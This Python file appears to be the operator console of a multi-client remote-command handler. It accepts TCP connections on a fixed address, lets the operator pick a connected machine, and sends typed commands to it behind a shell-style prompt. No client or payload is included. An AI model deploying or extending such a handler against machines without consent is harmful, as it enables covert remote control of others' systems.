import socket
import threading

FORMAT = "utf-8"


class Server:

    def __init__(self, address):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.address = address
        self.socket_list = []
        self.address_list = []

    def bind(self):
        self.server.bind(self.address)

    def listen(self):
        self.server.listen()
        print("Waiting for connections...")
        while True:
            connection, address = self.server.accept()
            self.socket_list.append(connection)
            self.address_list.append(address[0])
            print(f"{address} has connected!")
            connection.send("Connected successfully!".encode(FORMAT))


def main():
    address = ("172.20.130.1", 6565)
    server = Server(address)
    server.bind()
    listening = threading.Thread(target=server.listen)
    listening.start()
    chosen = None
    text = ""
    while text != "!EXIT":
        if not chosen:
            print(server.address_list)
            text = input("Enter the index: ")
            if text and text != "!EXIT":
                try:
                    chosen = server.socket_list[int(text)]
                except Exception as e:
                    print(e)
        else:
            text = input(f"[{server.address_list[server.socket_list.index(chosen)]}]-$: ")
            if text == "!DISC":
                chosen = None
            else:
                try:
                    chosen.send(text.encode(FORMAT))
                    print(chosen.recv(8192).decode('ansi'))
                except Exception as e:
                    print(e)
                    server.address_list.pop(server.socket_list.index(chosen))
                    server.socket_list.remove(chosen)
                    chosen = None


if __name__ == '__main__':
    main()
